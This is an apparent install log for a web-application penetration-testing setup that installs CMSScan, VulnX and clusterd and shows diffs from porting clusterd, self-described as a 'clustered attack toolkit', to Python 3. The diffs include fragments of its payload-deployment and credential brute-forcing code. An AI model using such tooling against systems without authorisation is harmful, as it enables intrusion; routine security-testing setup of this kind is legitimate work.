+[2026-03-04 13:55:18] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan submodule update --init --recursive
+[2026-03-04 13:55:18] RUN(user:spabam): python3 -m venv /home/spabam/.venv/cms_scanner/cmsscan
+[2026-03-04 13:55:19] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmsscan/bin/python -
+[2026-03-04 13:55:20] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmsscan/bin/pip install --upgrade pip
+Requirement already satisfied: pip in /home/spabam/.venv/cms_scanner/cmsscan/lib/python3.13/site-packages (25.1.1)
+Collecting pip
+  Using cached pip-26.0.1-py3-none-any.whl.metadata (4.7 kB)
+Using cached pip-26.0.1-py3-none-any.whl (1.8 MB)
+Installing collected packages: pip
+  Attempting uninstall: pip
+    Found existing installation: pip 25.1.1
+    Uninstalling pip-25.1.1:
+      Successfully uninstalled pip-25.1.1
+Successfully installed pip-26.0.1
+[2026-03-04 13:55:20] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmsscan/bin/python -
+[2026-03-04 13:55:20] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmsscan/bin/pip install -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt
+Collecting Flask (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 1))
+  Downloading flask-3.1.3-py3-none-any.whl.metadata (3.2 kB)
+Collecting Flask-BasicAuth (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 2))
+  Downloading Flask-BasicAuth-0.2.0.tar.gz (16 kB)
+  Installing build dependencies: started
+  Installing build dependencies: finished with status 'done'
+  Getting requirements to build wheel: started
+  Getting requirements to build wheel: finished with status 'done'
+  Preparing metadata (pyproject.toml): started
+  Preparing metadata (pyproject.toml): finished with status 'done'
+Collecting requests (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 3))
+  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
+Collecting gunicorn (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 4))
+  Downloading gunicorn-25.1.0-py3-none-any.whl.metadata (5.5 kB)
+Collecting fake_useragent (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 5))
+  Downloading fake_useragent-2.2.0-py3-none-any.whl.metadata (17 kB)
+Collecting droopescan (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 6))
+  Using cached droopescan-1.45.1-py2.py3-none-any.whl.metadata (6.8 kB)
+Collecting blinker>=1.9.0 (from Flask->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 1))
+  Downloading blinker-1.9.0-py3-none-any.whl.metadata (1.6 kB)
+Collecting click>=8.1.3 (from Flask->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 1))
+  Downloading click-8.3.1-py3-none-any.whl.metadata (2.6 kB)
+Collecting itsdangerous>=2.2.0 (from Flask->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 1))
+  Downloading itsdangerous-2.2.0-py3-none-any.whl.metadata (1.9 kB)
+Collecting jinja2>=3.1.2 (from Flask->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 1))
+  Downloading jinja2-3.1.6-py3-none-any.whl.metadata (2.9 kB)
+Collecting markupsafe>=2.1.1 (from Flask->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 1))
+  Downloading markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (2.7 kB)
+Collecting werkzeug>=3.1.0 (from Flask->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 1))
+  Downloading werkzeug-3.1.6-py3-none-any.whl.metadata (4.0 kB)
+Collecting charset_normalizer<4,>=2 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 3))
+  Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
+Collecting idna<4,>=2.5 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 3))
+  Using cached idna-3.11-py3-none-any.whl.metadata (8.4 kB)
+Collecting urllib3<3,>=1.21.1 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 3))
+  Using cached urllib3-2.6.3-py3-none-any.whl.metadata (6.9 kB)
+Collecting certifi>=2017.4.17 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 3))
+  Using cached certifi-2026.2.25-py3-none-any.whl.metadata (2.5 kB)
+Collecting packaging (from gunicorn->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 4))
+  Using cached packaging-26.0-py3-none-any.whl.metadata (3.3 kB)
+Collecting cement<2.6.99,>=2.6 (from droopescan->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 6))
+  Using cached cement-2.6.2-py3-none-any.whl
+Collecting pystache (from droopescan->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/CMSScan/requirements.txt (line 6))
+  Using cached pystache-0.6.8-py3-none-any.whl.metadata (14 kB)
+Downloading flask-3.1.3-py3-none-any.whl (103 kB)
+Using cached requests-2.32.5-py3-none-any.whl (64 kB)
+Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (153 kB)
+Using cached idna-3.11-py3-none-any.whl (71 kB)
+Using cached urllib3-2.6.3-py3-none-any.whl (131 kB)
+Downloading gunicorn-25.1.0-py3-none-any.whl (197 kB)
+Downloading fake_useragent-2.2.0-py3-none-any.whl (161 kB)
+Using cached droopescan-1.45.1-py2.py3-none-any.whl (514 kB)
+Downloading blinker-1.9.0-py3-none-any.whl (8.5 kB)
+Using cached certifi-2026.2.25-py3-none-any.whl (153 kB)
+Downloading click-8.3.1-py3-none-any.whl (108 kB)
+Downloading itsdangerous-2.2.0-py3-none-any.whl (16 kB)
+Downloading jinja2-3.1.6-py3-none-any.whl (134 kB)
+Downloading markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (22 kB)
+Downloading werkzeug-3.1.6-py3-none-any.whl (225 kB)
+Using cached packaging-26.0-py3-none-any.whl (74 kB)
+Using cached pystache-0.6.8-py3-none-any.whl (82 kB)
+Building wheels for collected packages: Flask-BasicAuth
+  Building wheel for Flask-BasicAuth (pyproject.toml): started
+  Building wheel for Flask-BasicAuth (pyproject.toml): finished with status 'done'
+  Created wheel for Flask-BasicAuth: filename=flask_basicauth-0.2.0-py3-none-any.whl size=4320 sha256=80bfe0e7c9983b98a6e2b595160f37b20dab481a02ce474ac5386523a9fdcc99
+  Stored in directory: /home/spabam/.cache/pip/wheels/95/0c/5f/15b54ef498c160f2865f5e01ecccf93376be36c8234751c3fc
+Successfully built Flask-BasicAuth
+Installing collected packages: cement, urllib3, pystache, packaging, markupsafe, itsdangerous, idna, fake_useragent, click, charset_normalizer, certifi, blinker, werkzeug, requests, jinja2, gunicorn, Flask, droopescan, Flask-BasicAuth
+
+Successfully installed Flask-3.1.3 Flask-BasicAuth-0.2.0 blinker-1.9.0 cement-2.6.2 certifi-2026.2.25 charset_normalizer-3.4.4 click-8.3.1 droopescan-1.45.1 fake_useragent-2.2.0 gunicorn-25.1.0 idna-3.11 itsdangerous-2.2.0 jinja2-3.1.6 markupsafe-3.0.3 packaging-26.0 pystache-0.6.8 requests-2.32.5 urllib3-2.6.3 werkzeug-3.1.6
+[2026-03-04 13:55:22] RUN(user:spabam): /home/spabam/.venv/cms_scanner/cmsscan/bin/python -
+[2026-03-04 13:55:22] OK: CMSScan installed
+[2026-03-04 13:55:22] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/vulnx pull --ff-only
+Already up to date.
+[2026-03-04 13:55:23] RUN(user:spabam): python3 -m venv /home/spabam/.venv/cms_scanner/vulnx
+[2026-03-04 13:55:24] RUN(user:spabam): /home/spabam/.venv/cms_scanner/vulnx/bin/python -
+[2026-03-04 13:55:24] RUN(user:spabam): /home/spabam/.venv/cms_scanner/vulnx/bin/pip install --upgrade pip
+Requirement already satisfied: pip in /home/spabam/.venv/cms_scanner/vulnx/lib/python3.13/site-packages (25.1.1)
+Collecting pip
+  Using cached pip-26.0.1-py3-none-any.whl.metadata (4.7 kB)
+Using cached pip-26.0.1-py3-none-any.whl (1.8 MB)
+Installing collected packages: pip
+  Attempting uninstall: pip
+    Found existing installation: pip 25.1.1
+    Uninstalling pip-25.1.1:
+      Successfully uninstalled pip-25.1.1
+Successfully installed pip-26.0.1
+[2026-03-04 13:55:25] RUN(user:spabam): /home/spabam/.venv/cms_scanner/vulnx/bin/python -
+[2026-03-04 13:55:25] RUN(user:spabam): /home/spabam/.venv/cms_scanner/vulnx/bin/pip install -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/vulnx/requirements.txt
+Collecting requests (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/vulnx/requirements.txt (line 1))
+  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
+Collecting bs4 (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/vulnx/requirements.txt (line 2))
+  Using cached bs4-0.0.2-py2.py3-none-any.whl.metadata (411 bytes)
+Collecting charset_normalizer<4,>=2 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/vulnx/requirements.txt (line 1))
+  Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
+Collecting idna<4,>=2.5 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/vulnx/requirements.txt (line 1))
+  Using cached idna-3.11-py3-none-any.whl.metadata (8.4 kB)
+Collecting urllib3<3,>=1.21.1 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/vulnx/requirements.txt (line 1))
+  Using cached urllib3-2.6.3-py3-none-any.whl.metadata (6.9 kB)
+Collecting certifi>=2017.4.17 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/vulnx/requirements.txt (line 1))
+  Using cached certifi-2026.2.25-py3-none-any.whl.metadata (2.5 kB)
+Collecting beautifulsoup4 (from bs4->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/vulnx/requirements.txt (line 2))
+  Using cached beautifulsoup4-4.14.3-py3-none-any.whl.metadata (3.8 kB)
+Collecting soupsieve>=1.6.1 (from beautifulsoup4->bs4->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/vulnx/requirements.txt (line 2))
+  Using cached soupsieve-2.8.3-py3-none-any.whl.metadata (4.6 kB)
+Collecting typing-extensions>=4.0.0 (from beautifulsoup4->bs4->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/vulnx/requirements.txt (line 2))
+  Using cached typing_extensions-4.15.0-py3-none-any.whl.metadata (3.3 kB)
+Using cached requests-2.32.5-py3-none-any.whl (64 kB)
+Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (153 kB)
+Using cached idna-3.11-py3-none-any.whl (71 kB)
+Using cached urllib3-2.6.3-py3-none-any.whl (131 kB)
+Using cached bs4-0.0.2-py2.py3-none-any.whl (1.2 kB)
+Using cached certifi-2026.2.25-py3-none-any.whl (153 kB)
+Using cached beautifulsoup4-4.14.3-py3-none-any.whl (107 kB)
+Using cached soupsieve-2.8.3-py3-none-any.whl (37 kB)
+Using cached typing_extensions-4.15.0-py3-none-any.whl (44 kB)
+Installing collected packages: urllib3, typing-extensions, soupsieve, idna, charset_normalizer, certifi, requests, beautifulsoup4, bs4
+
+Successfully installed beautifulsoup4-4.14.3 bs4-0.0.2 certifi-2026.2.25 charset_normalizer-3.4.4 idna-3.11 requests-2.32.5 soupsieve-2.8.3 typing-extensions-4.15.0 urllib3-2.6.3
+[2026-03-04 13:55:25] OK: VulnX installed
+[2026-03-04 13:55:25] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/clusterd pull --ff-only
+Already up to date.
+[2026-03-04 13:55:26] RUN(user:spabam): python3 -m venv /home/spabam/.venv/cms_scanner/clusterd
+[2026-03-04 13:55:27] RUN(user:spabam): /home/spabam/.venv/cms_scanner/clusterd/bin/python -
+[2026-03-04 13:55:27] RUN(user:spabam): /home/spabam/.venv/cms_scanner/clusterd/bin/pip install --upgrade pip
+Requirement already satisfied: pip in /home/spabam/.venv/cms_scanner/clusterd/lib/python3.13/site-packages (25.1.1)
+Collecting pip
+  Using cached pip-26.0.1-py3-none-any.whl.metadata (4.7 kB)
+Using cached pip-26.0.1-py3-none-any.whl (1.8 MB)
+Installing collected packages: pip
+  Attempting uninstall: pip
+    Found existing installation: pip 25.1.1
+    Uninstalling pip-25.1.1:
+      Successfully uninstalled pip-25.1.1
+Successfully installed pip-26.0.1
+[2026-03-04 13:55:27] RUN(user:spabam): /home/spabam/.venv/cms_scanner/clusterd/bin/python -
+[2026-03-04 13:55:27] RUN(user:spabam): /home/spabam/.venv/cms_scanner/clusterd/bin/pip install -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/clusterd/requirements.txt
+Collecting requests>=2.2.1 (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/clusterd/requirements.txt (line 1))
+  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
+Collecting charset_normalizer<4,>=2 (from requests>=2.2.1->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/clusterd/requirements.txt (line 1))
+  Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
+Collecting idna<4,>=2.5 (from requests>=2.2.1->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/clusterd/requirements.txt (line 1))
+  Using cached idna-3.11-py3-none-any.whl.metadata (8.4 kB)
+Collecting urllib3<3,>=1.21.1 (from requests>=2.2.1->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/clusterd/requirements.txt (line 1))
+  Using cached urllib3-2.6.3-py3-none-any.whl.metadata (6.9 kB)
+Collecting certifi>=2017.4.17 (from requests>=2.2.1->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/clusterd/requirements.txt (line 1))
+  Using cached certifi-2026.2.25-py3-none-any.whl.metadata (2.5 kB)
+Using cached requests-2.32.5-py3-none-any.whl (64 kB)
+Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (153 kB)
+Using cached idna-3.11-py3-none-any.whl (71 kB)
+Using cached urllib3-2.6.3-py3-none-any.whl (131 kB)
+Using cached certifi-2026.2.25-py3-none-any.whl (153 kB)
+Installing collected packages: urllib3, idna, charset_normalizer, certifi, requests
+
+Successfully installed certifi-2026.2.25 charset_normalizer-3.4.4 idna-3.11 requests-2.32.5 urllib3-2.6.3
+[2026-03-04 13:55:28] RUN(user:spabam): /home/spabam/.venv/cms_scanner/clusterd/bin/pip install modernize six
+Collecting modernize
+  Downloading modernize-0.8.0-py2.py3-none-any.whl.metadata (2.5 kB)
+Collecting six
+  Using cached six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
+Collecting fissix (from modernize)
+  Downloading fissix-24.4.24-py3-none-any.whl.metadata (2.1 kB)
+Collecting appdirs>=1.4.4 (from fissix->modernize)
+  Downloading appdirs-1.4.4-py2.py3-none-any.whl.metadata (9.0 kB)
+Downloading modernize-0.8.0-py2.py3-none-any.whl (27 kB)
+Using cached six-1.17.0-py2.py3-none-any.whl (11 kB)
+Downloading fissix-24.4.24-py3-none-any.whl (188 kB)
+Downloading appdirs-1.4.4-py2.py3-none-any.whl (9.6 kB)
+Installing collected packages: appdirs, six, fissix, modernize
+
+Successfully installed appdirs-1.4.4 fissix-24.4.24 modernize-0.8.0 six-1.17.0
+[2026-03-04 13:55:28] RUN(user:spabam): rm -rf /home/spabam/.venv/cms_scanner/_build/clusterd-src
+[2026-03-04 13:55:28] RUN(user:spabam): cp -a /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/clusterd /home/spabam/.venv/cms_scanner/_build/clusterd-src
+[2026-03-04 13:55:28] RUN(user:spabam): /home/spabam/.venv/cms_scanner/clusterd/bin/modernize -w -n -f default -x import -x imports_six -x itertools_imports_six -x urllib_six /home/spabam/.venv/cms_scanner/_build/clusterd-src
+ Loading the following fixers:
+    fissix.fixes.fix_apply  (apply)
+    fissix.fixes.fix_except  (except)
+    fissix.fixes.fix_exec  (exec)
+    fissix.fixes.fix_execfile  (execfile)
+    fissix.fixes.fix_exitfunc  (exitfunc)
+    fissix.fixes.fix_funcattrs  (funcattrs)
+    fissix.fixes.fix_has_key  (has_key)
+    fissix.fixes.fix_idioms  (idioms)
+    fissix.fixes.fix_long  (long)
+    fissix.fixes.fix_methodattrs  (methodattrs)
+    fissix.fixes.fix_ne  (ne)
+    fissix.fixes.fix_numliterals  (numliterals)
+    fissix.fixes.fix_operator  (operator)
+    fissix.fixes.fix_paren  (paren)
+    fissix.fixes.fix_reduce  (reduce)
+    fissix.fixes.fix_renames  (renames)
+    fissix.fixes.fix_repr  (repr)
+    fissix.fixes.fix_set_literal  (set_literal)
+    fissix.fixes.fix_standarderror  (standarderror)
+    fissix.fixes.fix_sys_exc  (sys_exc)
+    fissix.fixes.fix_throw  (throw)
+    fissix.fixes.fix_tuple_params  (tuple_params)
+    fissix.fixes.fix_types  (types)
+    fissix.fixes.fix_ws_comma  (ws_comma)
+    fissix.fixes.fix_xreadlines  (xreadlines)
+    libmodernize.fixes.fix_basestring  (basestring)
+    libmodernize.fixes.fix_dict_six  (dict_six)
+    libmodernize.fixes.fix_file  (file)
+    libmodernize.fixes.fix_filter  (filter)
+    libmodernize.fixes.fix_input_six  (input_six)
+    libmodernize.fixes.fix_int_long_tuple  (int_long_tuple)
+    libmodernize.fixes.fix_itertools_six  (itertools_six)
+    libmodernize.fixes.fix_map  (map)
+    libmodernize.fixes.fix_metaclass  (metaclass)
+    libmodernize.fixes.fix_next  (next)
+    libmodernize.fixes.fix_print  (print)
+    libmodernize.fixes.fix_raise  (raise)
+    libmodernize.fixes.fix_raise_six  (raise_six)
+    libmodernize.fixes.fix_unichr  (unichr)
+    libmodernize.fixes.fix_unicode_type  (unicode_type)
+    libmodernize.fixes.fix_xrange_six  (xrange_six)
+    libmodernize.fixes.fix_zip  (zip)
+ Applying the following explicit transformations:
+    (None)
+
+RefactoringTool: Skipping optional fixer: idioms
+RefactoringTool: Skipping optional fixer: set_literal
+RefactoringTool: Skipping optional fixer: ws_comma
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/auxengine.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/deployer.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/fingerprint.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/utility.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib/cifstrap.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/module/deploy_utils.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/module/invoke_payload.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/axis2/authenticate.py
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/axis2/auxiliary/info_dump.py
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/auxengine.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/auxengine.py	(refactored)
+@@ -49,7 +49,7 @@
+                      vars(fingerengine.options)[sub('-','_',mod.flag)]):
+                     try:
+                         mod.run(fingerengine, fingerprint)
+-                    except Exception, e:
++                    except Exception as e:
+                         utility.Msg("Error with module: %s" % e, LOG.ERROR)
+ 
+                 found.append(mod.name)
+@@ -80,7 +80,7 @@
+ 
+         try:
+             mod = mod.Auxiliary()
+-        except Exception, e:
++        except Exception as e:
+             utility.Msg("Auxiliary %s failed to load: %s" % (auxiliary[1], e),
+                                                           LOG.DEBUG)
+             continue
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/deployer.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/deployer.py	(refactored)
+@@ -8,6 +8,7 @@
+ import utility
+ import importlib
+ import pkgutil
++from six.moves import range
+ 
+ 
+ def run(fingerengine):
+@@ -81,7 +82,7 @@
+ 
+                 try:
+                     deployer.deploy(fingerengine, fingerprint)
+-                except Exception, e:
++                except Exception as e:
+                     # catch and log as debug; likely an uncaught timeout
+                     utility.Msg("Deployer %s failed: %s" % (deployer.__name__, e),
+                                                            LOG.DEBUG)
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/fingerprint.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/fingerprint.py	(refactored)
+@@ -47,7 +47,7 @@
+                     if vars(self.options)['port']:
+                         fp.port = self.options.port
+                     match_fps.append(fp)
+-            except Exception, e:
++            except Exception as e:
+                 utility.Msg("Exception with fingerprint: %s" % e, LOG.DEBUG)
+         
+             if self.options.delay:
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/utility.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/utility.py	(refactored)
+@@ -1,9 +1,12 @@
++from __future__ import print_function
+ from datetime import date, datetime
+ from commands import getoutput
+ from socket import gethostbyname
+ from log import LOG
+ import state
+ import requests
++from six.moves import range
++from six.moves import input
+ 
+ """ Utility functions
+ """
+@@ -39,7 +42,7 @@
+     if level is LOG.DEBUG and not state.isdebug:
+         return
+ 
+-    if output: print output
++    if output: print(output)
+     log(string)
+ 
+ 
+@@ -56,9 +59,9 @@
+     """ Dumps the application header, printed once at startup.
+     """
+ 
+-    print '\033[32m\n\t\tclusterd/%s - clustered attack toolkit\033[0m' % version()
+-    print '\t\t\t\033[33m[Supporting %d platforms]\033[0m' % (len(state.supported_platforms)) 
+-    print ''
++    print('\033[32m\n\t\tclusterd/%s - clustered attack toolkit\033[0m' % version())
++    print('\t\t\t\033[33m[Supporting %d platforms]\033[0m' % (len(state.supported_platforms))) 
++    print('')
+ 
+ 
+ def version():
+@@ -90,7 +93,7 @@
+     ifconfig = getoutput("/sbin/ifconfig")
+     if state.listener:
+         ifconfig = ifconfig.split("\n")
+-        for idx in xrange(len(ifconfig)):
++        for idx in range(len(ifconfig)):
+             if state.listener in ifconfig[idx]:
+                 adapter = ifconfig[idx+1].split()[1][5:]
+     else:
+@@ -145,7 +148,7 @@
+         if "http" in args[0] and "https" not in args[0]:
+             args = (args[0].replace("http", "https", 1), )
+ 
+-    if not 'timeout' in kwargs.keys():
++    if not 'timeout' in list(kwargs.keys()):
+         kwargs['timeout'] = state.timeout
+ 
+     kwargs['verify'] = False
+@@ -207,7 +210,7 @@
+     """
+ 
+     try:
+-        tmp = raw_input(' \033[1;37m[%s] %s > \033[0m' % (timestamp(), output_string))
++        tmp = input(' \033[1;37m[%s] %s > \033[0m' % (timestamp(), output_string))
+     except KeyboardInterrupt:
+         return ''
+     return tmp
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib/cifstrap.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib/cifstrap.py	(refactored)
+@@ -4,6 +4,7 @@
+ import sys
+ import threading
+ import datetime
++from six.moves import range
+ 
+ """ Bulk of this code is credited to bwall (@botnet_hunter) 
+ This was modified to be quieter and to support NTLMv1
+@@ -182,5 +183,5 @@
+ 
+             self.conn.close()
+ 
+-        except Exception, e:
++        except Exception as e:
+             self.data = e
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/module/deploy_utils.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/module/deploy_utils.py	(refactored)
+@@ -1,3 +1,4 @@
++from __future__ import print_function
+ from src.platform.weblogic.interfaces import WINTERFACES
+ from time import sleep
+ from subprocess import Popen, PIPE, check_output,STDOUT
+@@ -38,7 +39,7 @@
+         # this might be too short for huge files
+         sleep(3.0)
+ 
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg(e, LOG.DEBUG)
+     finally:
+         kill(proc.pid, SIGINT)
+@@ -70,7 +71,7 @@
+         timeout = 0
+ 
+     if timeout is not 10:
+-        print ''
++        print('')
+ 
+     if timeout is 0:
+         utility.Msg("Remote server failed to retrieve file.", LOG.ERROR)
+@@ -89,7 +90,7 @@
+         res = check_output(["./webc_deploy.sh", url, local_url, str(usr),
+                             str(pswd)],
+                             cwd="./src/lib/jboss/webconsole_deploy")
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg(e, LOG.DEBUG)
+         res = e
+ 
+@@ -113,7 +114,7 @@
+             res = check_output(["./invkdeploy.sh", version, url, 
+                                 local_url, str(random_int)],
+                                 cwd="./src/lib/jboss/jmxinvoke_deploy",stderr=STDOUT)
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg(e, LOG.DEBUG)
+         res = str(e)
+     return res
+@@ -128,7 +129,7 @@
+         res = check_output(["./bshdeploy.sh", url, arch, version,
+                                               str(usr), str(pswd)],
+                             cwd="./src/lib/jboss/bsh_deploy")
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg(e, LOG.DEBUG)
+         res = e
+ 
+@@ -164,7 +165,7 @@
+                 utility.Msg("\t%s (%s [%s])" % (dp.title, deployer[1], 
+                                                 '|'.join(dp.versions)))
+ 
+-            except Exception, e:
++            except Exception as e:
+                 utility.Msg(e, LOG.DEBUG)
+                 continue
+ 
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/module/invoke_payload.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/module/invoke_payload.py	(refactored)
+@@ -165,7 +165,7 @@
+             cnt += 1
+             sleep(2)
+ 
+-    except Exception, e:
++    except Exception as e:
+         utility.Msg("Failed to invoke payload: %s" % e, LOG.ERROR)
+         status = False
+ 
+--- /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/axis2/authenticate.py	(original)
++++ /home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/axis2/authenticate.py	(refactored)
+@@ -1,3 +1,4 @@
++from __future__ import print_function
+ from requests.utils import dict_from_cookiejar
+ from log import LOG
+ from sys import stdout
+@@ -59,7 +60,7 @@
+ 
+                 cook = _auth(state.bf_user, word, url, version)
+                 if cook:
+-                    print '' # newline
++                    print('') # newline
+ 
+                     if not (state.bf_user, word) in default_credentials:
+                         default_credentials.insert(0, (state.bf_user, word))
+@@ -68,7 +69,7 @@
+                                     (state.bf_user, word), LOG.SUCCESS)
+                     return cook
+ 
+-            print ''
++            print('')
+ 
+         except KeyboardInterrupt:
+             pass
